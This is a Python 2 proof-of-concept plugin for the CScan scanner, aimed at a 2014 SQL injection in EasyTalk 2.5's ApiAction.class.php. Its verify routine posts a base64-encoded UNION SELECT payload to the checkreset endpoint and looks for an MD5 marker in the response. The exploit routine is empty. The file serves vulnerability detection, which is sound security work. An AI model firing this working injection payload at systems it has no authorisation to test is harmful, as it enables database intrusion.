# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re

class Vuln(ABVuln):
    poc_id = '6c1c93a1-a319-46ff-9927-83a45acf669a'
    name = 'EasyTalk 2.5 /Home/Lib/Action/ApiAction.class.php SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-05-24'  # 漏洞公布时间
    desc = '''
        EasyTalk 2.5 /Home/Lib/Action/ApiAction.class.php 文件参数username变量未合适过滤，导致SQL注入漏洞。
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=051788
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'EasyTalk'  # 漏洞应用名称
    product_version = '2.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '47fa52fb-30c6-48f0-a298-6e3316325815'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))      
            
            verify_url = '{target}'.format(target=self.target)+'/?m=index&a=checkreset'
            payload = ("urldata=YWFhYWFhYWEmdXNlcl9uYW1lPXl1XCZtYWlsYWRyZXM9VU5JT04vKiovU0VMRUNULyoqLzEsMixtZDUo"
                   "MTIzMzIxKSw0LDUsNiw3LDgsOSwxMCwxMSwxMiwxMywxNCwxNSwxNiwxNywxOCwxOSwyMCwyMSwyMiwyMywyNCwy"
                   "NSwyNiwyNywyOCwyOSwzMCwzMSwzMiwzMywzNCwzNSwzNiwzNywzOCwzOSw0MCw0MSM=")
            
            req = urllib2.Request(verify_url, payload)
            content = urllib2.urlopen(req).read()
            if 'c8837b23ff8aaa8a2dde915473ce0991' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()
        

if __name__ == '__main__':
    Poc().run()